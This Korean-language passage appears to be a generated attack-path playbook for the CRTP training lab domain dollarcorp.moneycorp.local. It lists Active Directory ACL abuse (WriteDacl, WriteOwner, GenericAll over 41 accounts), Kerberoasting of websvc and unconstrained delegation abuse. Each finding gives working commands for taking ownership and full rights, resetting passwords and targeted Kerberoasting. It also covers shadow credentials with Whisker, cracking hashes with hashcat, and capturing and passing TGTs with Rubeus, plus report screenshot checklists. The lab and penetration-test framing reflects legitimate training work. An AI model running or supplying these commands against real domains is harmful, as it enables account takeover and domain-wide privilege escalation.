- **메모**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: WriteDacl  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- **확인할 것**:
  - [ ] RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: WriteOwner  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- **확인할 것**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: WriteOwner  ·  _Domain Privilege Escalation / Persistence_  (prio 25)
- **대상**: RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _PowerView_:
    ```
    # 소유권/DACL 장악 후 권한 부여
    ```
    ```
    Set-DomainObjectOwner -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -OwnerIdentity <you>
    ```
    ```
    Add-DomainObjectAcl -TargetIdentity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL -PrincipalIdentity <you> -Rights All
    ```
- **확인할 것**:
  - [ ] RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: RAS AND IAS SERVERS@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> RAS AND IAS SERVERS ACCESS CHECK@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [HIGH] ACL abuse: GenericAll (bulk — 41 targets)  ·  _Domain Privilege Escalation / Persistence_  (prio 26)
- **대상**: CONTROL201USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL202USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL203USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL204USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL205USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL206USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL207USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL208USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL209USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL210USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL211USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL212USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL213USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL214USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL215USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL216USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL217USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL218USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL219USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL220USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT201USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT202USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT203USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT204USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT205USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT206USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT207USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT208USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT209USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT210USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT211USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT212USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT213USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT214USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT215USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT216USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT217USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT218USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT219USER@DOLLARCORP.MONEYCORP.LOCAL, SUPPORT220USER@DOLLARCORP.MONEYCORP.LOCAL, APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericAll over 41 objects: CONTROL201USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL202USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL203USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL204USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL205USER@DOLLARCORP.MONEYCORP.LOCAL, CONTROL206USER@DOLLARCORP.MONEYCORP.LOCAL … (+35 more)
- **명령어**:
  - _Targeted (choose one)_:
    ```
    # 옵션 A: 패스워드 리셋
    ```
    ```
    Set-DomainUserPassword -Identity Control201user -AccountPassword (ConvertTo-SecureString '<NewPass123!>' -AsPlainText -Force)
    ```
    ```
    # 옵션 B: Targeted Kerberoast (SPN 부여 후 로스팅)
    ```
    ```
    Set-DomainObject -Identity Control201user -Set @{serviceprincipalname='fake/svc'}
    ```
    ```
    Rubeus.exe kerberoast /user:Control201user /nowrap
    ```
    ```
    # 옵션 C: Shadow Credentials
    ```
    ```
    Whisker.exe add /target:Control201user
    ```
- **확인할 것**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 경로에 필요한 대상 1개만 선택해 권한 행사 (전부 할 필요 없음)
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인 출력 (대표 대상 1개)
  - [ ] 권한 남용 실행 화면
  - [ ] 남용 후 획득 접근 증명 화면
- **메모**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 가 41개 객체에 GenericAll — 보통 그룹 권한으로 일괄 부여된 관계. 경로에 필요한 대상만 선택적으로 악용.

### [MEDIUM] Kerberoasting  ·  _Domain Privilege Escalation_  (prio 35)
- **대상**: websvc
- **근거**: websvc has SPN set; pwdlastset=1668400933
- **명령어**:
  - _Rubeus_:
    ```
    Rubeus.exe kerberoast /user:websvc /nowrap /outfile:hash_websvc.txt
    ```
  - _PowerView_:
    ```
    Invoke-Kerberoast -Identity websvc | fl
    ```
  - _AD Module_:
    ```
    Get-ADUser -Identity websvc -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName
    ```
  - _Crack_:
    ```
    hashcat -m 13100 hash_websvc.txt <wordlist> --force
    ```
- **확인할 것**:
  - [ ] SPN이 실제로 설정돼 있는지 (setspn -L 또는 Get-ADUser)
  - [ ] 해시 추출 성공 여부, 크랙된 평문 패스워드
  - [ ] 크랙한 계정이 어떤 그룹/권한을 가지는지 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] websvc SPN 확인 (Get-ADUser/setspn 출력)
  - [ ] Rubeus kerberoast 해시 추출 화면
  - [ ] hashcat 크랙 성공 (평문 노출) 화면
  - [ ] 크랙한 계정으로 인증/권한 확인 화면
- **메모**: Kerberoasting websvc. adminCount 계정이면 곧바로 권한 상승 경로일 수 있음.

### [INFO] Unconstrained Delegation abuse  ·  _Domain Privilege Escalation_  (prio 80)
- **대상**: DCORP-DC$
- **근거**: DCORP-DC$ (computer) TRUSTED_FOR_DELEGATION [DC — expected]
- **명령어**:
  - _Enum (PowerView)_:
    ```
    Get-DomainComputer -Unconstrained | select samaccountname
    ```
    ```
    Get-DomainUser -TrustedToAuth | select samaccountname
    ```
  - _Rubeus monitor_:
    ```
    Rubeus.exe monitor /interval:5 /nowrap
    ```
  - _Coerce (auth)_:
    ```
    # PetitPotam / SpoolSample 로 DC 인증 강제 → TGT 캡처
    ```
    ```
    Rubeus.exe tgtdeleg
    ```
  - _PTT_:
    ```
    Rubeus.exe ptt /ticket:<base64_TGT>
    ```
- **확인할 것**:
  - [ ] 해당 호스트에 로컬 관리자 권한이 있는지 (티켓 모니터링 전제)
  - [ ] 캡처된 TGT의 주체가 특권 계정/DC 컴퓨터 계정인지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] DCORP-DC$ Unconstrained delegation 속성 확인
  - [ ] Rubeus monitor 로 캡처된 TGT 화면
  - [ ] PTT 후 특권 접근 확인 (예: DCSync 또는 DC 접근)
- **메모**: 비-DC 호스트의 무제약 위임은 치명적. DC 인증 강제 후 TGT 탈취 경로.
